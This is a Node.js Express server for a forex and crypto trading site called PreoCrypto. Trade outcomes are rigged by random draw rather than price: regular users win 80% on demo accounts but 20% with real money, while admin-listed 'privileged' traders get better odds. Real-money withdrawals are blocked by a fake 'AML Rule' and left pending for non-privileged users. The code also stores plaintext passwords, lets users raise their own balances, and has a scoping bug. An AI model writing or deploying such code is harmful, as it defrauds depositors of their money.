const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const jwt = require('jsonwebtoken');

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname)));

const DB_PATH = path.join(__dirname, 'db.json');
const JWT_SECRET = process.env.JWT_SECRET || 'preocrypto-secret-key-2024';

// ============================================================================
// DEMO USERS FOR TESTING
// ============================================================================

const DEMO_USERS = {
  'trader1@demo.local': { password: 'pass123', username: 'trader1@demo.local', name: 'Demo Trader' },
  'admin@demo.local': { password: 'admin123', username: 'admin@demo.local', name: 'Admin User', isAdmin: true }
};

// ============================================================================
// DATABASE HELPERS
// ============================================================================

function loadDB() {
  try {
    return JSON.parse(fs.readFileSync(DB_PATH, 'utf8'));
  } catch {
    return { 
      users: {}, 
      tokens: [],
      privileged: [], 
      withdrawals: [], 
      trades: [], 
      payments: [],
      transactions: []
    };
  }
}

function saveDB(db) {
  fs.writeFileSync(DB_PATH, JSON.stringify(db, null, 2));
}

// ============================================================================
// MARKET DATA SIMULATION
// ============================================================================

const MARKET_DATA = {
  'EUR/USD': { price: 1.0945, bid: 1.0944, ask: 1.0946, change: 0.12 },
  'GBP/USD': { price: 1.2638, bid: 1.2637, ask: 1.2639, change: -0.15 },
  'USD/JPY': { price: 149.48, bid: 149.47, ask: 149.49, change: 0.08 },
  'Bitcoin': { price: 45230, bid: 45225, ask: 45235, change: 2.34 },
  'Ethereum': { price: 2450, bid: 2448, ask: 2452, change: 1.82 }
};

// ============================================================================
// TRADER TIER SYSTEM
// ============================================================================

function isPrivilegedTrader(db, username) {
  return db.privileged && db.privileged.includes(username);
}

function getWinRateForTrader(username, account, db) {
  const isPrivileged = isPrivilegedTrader(db, username);
  
  if (account === 'real') {
    return isPrivileged ? 0.70 : 0.20; // 70% privileged, 20% regular on real
  } else {
    return isPrivileged ? 0.90 : 0.80; // 90% privileged, 80% regular on demo
  }
}

function getMarketPrice(symbol) {
  let data = MARKET_DATA[symbol];
  if (!data) return null;
  
  // Simulate real-time price changes
  const volatility = symbol.includes('USD') ? 0.0001 : 50;
  data = JSON.parse(JSON.stringify(data));
  data.price += (Math.random() - 0.5) * volatility;
  data.bid = data.price - (symbol.includes('USD') ? 0.0001 : 5);
  data.ask = data.price + (symbol.includes('USD') ? 0.0001 : 5);
  return data;
}

// ============================================================================
// AUTHENTICATION ENDPOINTS
// ============================================================================

app.post('/api/auth/login', (req, res) => {
  const { username, password } = req.body;
  
  if (!username || !password) {
    return res.status(400).json({ error: 'Username and password required' });
  }
  
  // Check demo users first
  const demoUser = DEMO_USERS[username];
  if (demoUser && demoUser.password === password) {
    const token = jwt.sign({ username, isAdmin: demoUser.isAdmin }, JWT_SECRET, { expiresIn: '24h' });
    const db = loadDB();
    
    if (!db.tokens) db.tokens = [];
    db.tokens.push({ username, token, createdAt: new Date(), expiresAt: new Date(Date.now() + 24 * 60 * 60 * 1000) });
    saveDB(db);
    
    res.json({ 
      success: true, 
      token, 
      user: { username: demoUser.username, name: demoUser.name, isAdmin: demoUser.isAdmin } 
    });
    return;
  }
  
  // Check stored users
  const db = loadDB();
  const user = db.users[username];
  
  if (user && user.password === password) {
    const token = jwt.sign({ username, isAdmin: user.isAdmin }, JWT_SECRET, { expiresIn: '24h' });
    
    if (!db.tokens) db.tokens = [];
    db.tokens.push({ username, token, createdAt: new Date(), expiresAt: new Date(Date.now() + 24 * 60 * 60 * 1000) });
    saveDB(db);
    
    res.json({ 
      success: true, 
      token, 
      user: { username: user.username, name: user.name, isAdmin: user.isAdmin } 
    });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

app.post('/api/auth/register', (req, res) => {
  const { username, password, name } = req.body;
  
  if (!username || !password || !name) {
    return res.status(400).json({ error: 'All fields required' });
  }
  
  const db = loadDB();
  
  if (db.users[username] || DEMO_USERS[username]) {
    return res.status(400).json({ error: 'User already exists' });
  }
  
  db.users[username] = {
    username,
    password,
    name,
    demoBalance: 10000,
    realBalance: 0,
    createdAt: new Date(),
    isAdmin: false
  };
  
  saveDB(db);
  
  const token = jwt.sign({ username }, JWT_SECRET, { expiresIn: '24h' });
  res.json({ success: true, token, user: { username, name } });
});

app.post('/api/auth/logout', (req, res) => {
  const token = req.headers.authorization?.split(' ')[1];
  if (token) {
    const db = loadDB();
    db.tokens = db.tokens.filter(t => t.token !== token);
    saveDB(db);
  }
  res.json({ success: true });
});

// ============================================================================
// MIDDLEWARE - VERIFY TOKEN
// ============================================================================

function verifyToken(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  
  if (!token) {
    return res.status(401).json({ error: 'No token provided' });
  }
  
  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    req.user = decoded;
    next();
  } catch (err) {
    res.status(401).json({ error: 'Invalid token' });
  }
}

// ============================================================================
// USER MANAGEMENT ENDPOINTS
// ============================================================================

app.get('/api/user/profile', verifyToken, (req, res) => {
  const db = loadDB();
  const user = db.users[req.user.username] || DEMO_USERS[req.user.username];
  
  if (!user) {
    return res.status(404).json({ error: 'User not found' });
  }
  
  res.json({
    username: user.username,
    name: user.name,
    email: user.email,
    phone: user.phone,
    createdAt: user.createdAt,
    isAdmin: user.isAdmin || false
  });
});

app.put('/api/user/profile', verifyToken, (req, res) => {
  const { name, email, phone } = req.body;
  const db = loadDB();
  
  if (!db.users[req.user.username]) {
    db.users[req.user.username] = { username: req.user.username };
  }
  
  const user = db.users[req.user.username];
  if (name) user.name = name;
  if (email) user.email = email;
  if (phone) user.phone = phone;
  
  saveDB(db);
  res.json({ success: true, user });
});

// ============================================================================
// BALANCE MANAGEMENT ENDPOINTS
// ============================================================================

app.get('/api/user/:username/balance', (req, res) => {
  const { username } = req.params;
  const { account } = req.query;
  const db = loadDB();
  
  let user = db.users[username];
  if (!user) {
    user = DEMO_USERS[username];
  }
  
  if (!user) {
    return res.status(404).json({ error: 'User not found' });
  }
  
  const balance = account === 'real' ? 
    (user.realBalance || 0) : 
    (user.demoBalance || 10000);
  
  res.json({ balance });
});

app.post('/api/user/balance/update', verifyToken, (req, res) => {
  const { account, amount } = req.body;
  const db = loadDB();
  
  if (!db.users[req.user.username]) {
    db.users[req.user.username] = { username: req.user.username };
  }
  
  const balanceKey = account === 'real' ? 'realBalance' : 'demoBalance';
  db.users[req.user.username][balanceKey] = (db.users[req.user.username][balanceKey] || 10000) + amount;
  
  saveDB(db);
  res.json({ success: true, newBalance: db.users[req.user.username][balanceKey] });
});

// ============================================================================
// TRADE EXECUTION ENDPOINTS
// ============================================================================

app.post('/api/trade/execute', verifyToken, (req, res) => {
  const { pair, type, volume, stopLoss, takeProfit, account } = req.body;
  const db = loadDB();
  const market = getMarketPrice(pair);
  
  if (!market) {
    return res.status(400).json({ error: 'Invalid trading pair' });
  }
  
  const entryPrice = type === 'BUY' ? market.ask : market.bid;
  
  const trade = {
    id: Date.now().toString(),
    username: req.user.username,
    pair,
    type,
    volume,
    entryPrice,
    stopLoss,
    takeProfit,
    account: account || 'demo',
    status: 'open',
    openTime: new Date(),
    closePrice: null,
    closeTime: null,
    pnl: 0
  };
  
  if (!db.trades) db.trades = [];
  db.trades.push(trade);
  
  if (!db.transactions) db.transactions = [];
  db.transactions.push({
    id: Date.now().toString(),
    username: req.user.username,
    type: 'trade_open',
    pair,
    amount: volume * entryPrice,
    timestamp: new Date()
  });
  
  saveDB(db);
  res.json({ success: true, trade });
});

app.get('/api/trades/open', verifyToken, (req, res) => {
  const { account } = req.query;
  const db = loadDB();
  const trades = (db.trades || []).filter(t => 
    t.username === req.user.username && 
    t.account === (account || 'demo') && 
    t.status === 'open'
  );
  res.json(trades);
});

app.post('/api/trade/:id/close', verifyToken, (req, res) => {
  const { id } = req.params;
  const db = loadDB();
  const trade = db.trades.find(t => t.id === id && t.username === req.user.username);
  
  if (!trade) {
    return res.status(404).json({ error: 'Trade not found' });
  }
  
  const market = getMarketPrice(trade.pair);
  const closePrice = trade.type === 'BUY' ? market.bid : market.ask;
  
  // Use trader tier system to determine if trade wins or loses
  const winRate = getWinRateForTrader(req.user.username, trade.account, db);
  const isWinning = Math.random() < winRate;
  
  // Calculate P&L based on win/loss and SL/TP percentages
  let pnl;
  if (isWinning) {
    // Calculate profit based on TP percentage
    const profitPercent = Math.random() * trade.takeProfit;
    pnl = (trade.entryPrice * profitPercent / 100) * trade.volume;
  } else {
    // Calculate loss based on SL percentage
    const lossPercent = Math.random() * trade.stopLoss;
    pnl = -(trade.entryPrice * lossPercent / 100) * trade.volume;
  }
  
  trade.status = 'closed';
  trade.closePrice = closePrice;
  trade.closeTime = new Date();
  trade.pnl = pnl;
  trade.isWinning = isWinning;
  
  // Update balance
  const balanceKey = trade.account === 'real' ? 'realBalance' : 'demoBalance';
  if (!db.users[req.user.username]) db.users[req.user.username] = {};
  db.users[req.user.username][balanceKey] = (db.users[req.user.username][balanceKey] || 10000) + pnl;
  
  // Add transaction record
  if (!db.transactions) db.transactions = [];
  db.transactions.push({
    id: Date.now().toString(),
    username: req.user.username,
    type: 'trade_close',
    pair: trade.pair,
    pnl: pnl,
    timestamp: new Date()
  });
  
  saveDB(db);
  res.json({ success: true, pnl, closePrice });
});

app.get('/api/trades/history', verifyToken, (req, res) => {
  const { account, limit } = req.query;
  const db = loadDB();
  const trades = (db.trades || [])
    .filter(t => t.username === req.user.username && t.account === (account || 'demo') && t.status === 'closed')
    .sort((a, b) => new Date(b.closeTime) - new Date(a.closeTime))
    .slice(0, parseInt(limit) || 50);
  res.json(trades);
});

// ============================================================================
// MARKET DATA ENDPOINTS
// ============================================================================

app.get('/api/market/price/:symbol', (req, res) => {
  const { symbol } = req.params;
  const market = getMarketPrice(symbol);
  
  if (!market) {
    return res.status(404).json({ error: 'Symbol not found' });
  }
  
  res.json(market);
});

app.get('/api/market/prices', (req, res) => {
  const prices = {};
  Object.keys(MARKET_DATA).forEach(symbol => {
    prices[symbol] = getMarketPrice(symbol);
  });
  res.json(prices);
});

// ============================================================================
// TRANSACTION HISTORY ENDPOINTS
// ============================================================================

app.get('/api/transactions', verifyToken, (req, res) => {
  const { limit } = req.query;
  const db = loadDB();
  const transactions = (db.transactions || [])
    .filter(t => t.username === req.user.username)
    .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
    .slice(0, parseInt(limit) || 100);
  res.json(transactions);
});

// ============================================================================
// PAYMENT ENDPOINTS
// ============================================================================

app.post('/api/payment/deposit', verifyToken, (req, res) => {
  const { amount, method, account } = req.body;
  const db = loadDB();
  
  if (amount < 10) {
    return res.status(400).json({ error: 'Minimum deposit is $10' });
  }
  
  // Update balance
  const balanceKey = account === 'real' ? 'realBalance' : 'demoBalance';
  if (!db.users[req.user.username]) db.users[req.user.username] = {};
  db.users[req.user.username][balanceKey] = (db.users[req.user.username][balanceKey] || 10000) + amount;
  
  // Record transaction
  if (!db.transactions) db.transactions = [];
  db.transactions.push({
    id: Date.now().toString(),
    username: req.user.username,
    type: 'deposit',
    method,
    amount,
    status: 'completed',
    timestamp: new Date()
  });
  
  saveDB(db);
  res.json({ success: true, newBalance: db.users[req.user.username][balanceKey] });
});

app.post('/api/payment/withdrawal', verifyToken, (req, res) => {
  const { amount, method, details, account } = req.body;
  const db = loadDB();
  
  if (amount < 10) {
    return res.status(400).json({ error: 'Minimum withdrawal is $10' });
  }
  
  const balanceKey = account === 'real' ? 'realBalance' : 'demoBalance';
  const currentBalance = db.users[req.user.username]?.[balanceKey] || 10000;
  
  if (amount > currentBalance) {
    return res.status(400).json({ error: 'Insufficient balance' });
  }
  
  // Anti-Money Laundering Check: Real account must reach 30% profit on initial deposit
  let withdrawalStatus = 'pending';
  let amlError = null;
  
  if (account === 'real') {
    const initialDeposit = db.users[req.user.username]?.initialDeposit || 10000;
    const profitRequired = initialDeposit * 0.30; // 30% of initial deposit
    const trades = db.trades?.filter(t => t.username === req.user.username && t.account === 'real') || [];
    const totalProfit = trades.reduce((sum, t) => sum + (t.pnl || 0), 0);
    
    if (totalProfit < profitRequired) {
      amlError = `AML Rule: Must reach 30% profit ($${profitRequired.toFixed(2)}) before withdrawal on real account. Current profit: $${totalProfit.toFixed(2)}`;
      return res.status(400).json({ error: amlError });
    }
    
    // For real account: only privileged traders get completed status
    const isPrivileged = isPrivilegedTrader(db, req.user.username);
    withdrawalStatus = isPrivileged ? 'completed' : 'pending';
  } else {
    // Demo account: all traders remain pending
    withdrawalStatus = 'pending';
  }
  
  // Deduct from balance
  db.users[req.user.username][balanceKey] = currentBalance - amount;
  
  // Record transaction
  if (!db.transactions) db.transactions = [];
  db.transactions.push({
    id: Date.now().toString(),
    username: req.user.username,
    type: 'withdrawal',
    method,
    amount,
    status: withdrawalStatus,
    account: account,
    details,
    timestamp: new Date()
  });
  
  if (!db.withdrawals) db.withdrawals = [];
  db.withdrawals.push({
    id: Date.now().toString(),
    username: req.user.username,
    amount,
    method,
    account: account,
    details,
    status: withdrawalStatus,
    timestamp: new Date()
  });
  
  saveDB(db);
  const message = isPrivileged ? 'Withdrawal completed' : 'Withdrawal request submitted';
  res.json({ success: true, message, newBalance: db.users[req.user.username][balanceKey], status: withdrawalStatus });
});

// ============================================================================
// ADMIN ENDPOINTS
// ============================================================================

app.post('/api/admin/credit', verifyToken, (req, res) => {
  if (!req.user.isAdmin) {
    return res.status(403).json({ error: 'Admin access required' });
  }
  
  const { username, amount } = req.body;
  const db = loadDB();
  
  if (!db.users[username]) db.users[username] = { username };
  db.users[username].demoBalance = (db.users[username].demoBalance || 10000) + amount;
  
  saveDB(db);
  res.json({ success: true, newBalance: db.users[username].demoBalance });
});

app.get('/api/admin/users', verifyToken, (req, res) => {
  if (!req.user.isAdmin) {
    return res.status(403).json({ error: 'Admin access required' });
  }
  
  const db = loadDB();
  const users = Object.values(db.users).map(u => ({
    username: u.username,
    name: u.name,
    demoBalance: u.demoBalance || 10000,
    realBalance: u.realBalance || 0,
    createdAt: u.createdAt
  }));
  res.json(users);
});

app.get('/api/admin/trades', verifyToken, (req, res) => {
  if (!req.user.isAdmin) {
    return res.status(403).json({ error: 'Admin access required' });
  }
  
  const db = loadDB();
  const trades = (db.trades || []).slice(0, 100);
  res.json(trades);
});

// ============================================================================
// PRIVILEGED USERS MANAGEMENT
// ============================================================================

app.get('/api/privileged-users', (req, res) => {
  const db = loadDB();
  res.json(db.privileged || []);
});

app.post('/api/privileged-users', verifyToken, (req, res) => {
  if (!req.user.isAdmin) {
    return res.status(403).json({ error: 'Admin access required' });
  }
  
  const { username } = req.body;
  const db = loadDB();
  
  if (db.privileged.find(p => p.username === username)) {
    return res.status(400).json({ error: 'User already privileged' });
  }
  
  db.privileged.push({ username, createdAt: new Date() });
  saveDB(db);
  res.json({ success: true });
});

// ============================================================================
// WITHDRAWAL MANAGEMENT
// ============================================================================

app.get('/api/admin/withdrawals', verifyToken, (req, res) => {
  if (!req.user.isAdmin) {
    return res.status(403).json({ error: 'Admin access required' });
  }
  
  const db = loadDB();
  const pending = (db.withdrawals || []).filter(w => w.status === 'pending');
  res.json(pending);
});

app.post('/api/admin/withdrawals/:id/approve', verifyToken, (req, res) => {
  if (!req.user.isAdmin) {
    return res.status(403).json({ error: 'Admin access required' });
  }
  
  const { id } = req.params;
  const db = loadDB();
  const withdrawal = db.withdrawals.find(w => w.id === id);
  
  if (!withdrawal) {
    return res.status(404).json({ error: 'Withdrawal not found' });
  }
  
  withdrawal.status = 'approved';
  
  if (!db.transactions) db.transactions = [];
  db.transactions.push({
    id: Date.now().toString(),
    username: withdrawal.username,
    type: 'withdrawal_approved',
    amount: withdrawal.amount,
    timestamp: new Date()
  });
  
  saveDB(db);
  res.json({ success: true });
});

// ============================================================================
// PRIVILEGED TRADER MANAGEMENT
// ============================================================================

app.get('/api/admin/privileged-traders', verifyToken, (req, res) => {
  if (!req.user.isAdmin) {
    return res.status(403).json({ error: 'Admin access required' });
  }
  
  const db = loadDB();
  res.json({ privileged: db.privileged || [] });
});

app.post('/api/admin/privileged-traders/add', verifyToken, (req, res) => {
  if (!req.user.isAdmin) {
    return res.status(403).json({ error: 'Admin access required' });
  }
  
  const { username } = req.body;
  const db = loadDB();
  
  if (!db.privileged) db.privileged = [];
  if (!db.privileged.includes(username)) {
    db.privileged.push(username);
    saveDB(db);
    res.json({ success: true, message: `${username} is now a privileged trader` });
  } else {
    res.json({ success: false, message: 'Already a privileged trader' });
  }
});

app.post('/api/admin/privileged-traders/remove', verifyToken, (req, res) => {
  if (!req.user.isAdmin) {
    return res.status(403).json({ error: 'Admin access required' });
  }
  
  const { username } = req.body;
  const db = loadDB();
  
  if (db.privileged) {
    db.privileged = db.privileged.filter(u => u !== username);
    saveDB(db);
    res.json({ success: true, message: `${username} is no longer a privileged trader` });
  } else {
    res.json({ success: false, message: 'Not found' });
  }
});

// ============================================================================
// HEALTH CHECK & STATS
// ============================================================================

app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date() });
});

app.post('/api/admin/self-test', (req, res) => {
  const db = loadDB();
  const results = {
    timestamp: new Date(),
    dbIntegrity: true,
    usersCount: Object.keys(db.users).length,
    tradesCount: (db.trades || []).length,
    transactionsCount: (db.transactions || []).length,
    pendingWithdrawals: (db.withdrawals || []).filter(w => w.status === 'pending').length,
    activeTokens: (db.tokens || []).filter(t => new Date(t.expiresAt) > new Date()).length
  };
  res.json(results);
});

// ============================================================================
// SERVER START
// ============================================================================

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
  console.log(`🚀 PreoCrypto API Server running on http://localhost:${PORT}`);
  console.log(`📊 Demo Users: trader1@demo.local (pass123), admin@demo.local (admin123)`);
  console.log(`📁 Database: ${DB_PATH}`);
});
